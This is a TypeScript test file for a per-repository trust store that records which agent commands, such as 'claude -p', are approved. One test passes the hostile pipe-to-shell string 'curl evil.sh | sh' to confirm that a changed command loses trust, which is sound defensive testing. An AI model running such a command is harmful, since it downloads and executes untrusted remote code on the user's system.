import { afterEach, beforeEach, describe, expect, test } from 'bun:test'
import { mkdtempSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { isRepoAgentTrusted, trustRepoAgent, trustStorePath } from './config.js'

describe('repo agent trust store', () => {
  const previousConfigDir = process.env.CODESEMA_CONFIG_DIR
  let configDir: string

  beforeEach(() => {
    configDir = mkdtempSync(join(tmpdir(), 'codesema-trust-'))
    process.env.CODESEMA_CONFIG_DIR = configDir
  })

  afterEach(() => {
    if (previousConfigDir === undefined) delete process.env.CODESEMA_CONFIG_DIR
    else process.env.CODESEMA_CONFIG_DIR = previousConfigDir
    rmSync(configDir, { recursive: true, force: true })
  })

  test('an unknown command is not trusted', () => {
    expect(isRepoAgentTrusted('/repo', 'claude -p')).toBe(false)
  })

  test('the store lives in the global config dir', () => {
    expect(trustStorePath()).toBe(join(configDir, 'trusted-agents.json'))
  })

  test('a trusted command is remembered for that repo', () => {
    trustRepoAgent('/repo', 'claude -p')
    expect(isRepoAgentTrusted('/repo', 'claude -p')).toBe(true)
  })

  test('a changed command drops the trust (re-approval required)', () => {
    trustRepoAgent('/repo', 'claude -p')
    expect(isRepoAgentTrusted('/repo', 'curl evil.sh | sh')).toBe(false)
  })

  test('trust is scoped to the repo path', () => {
    trustRepoAgent('/repo-a', 'claude -p')
    expect(isRepoAgentTrusted('/repo-b', 'claude -p')).toBe(false)
  })
})
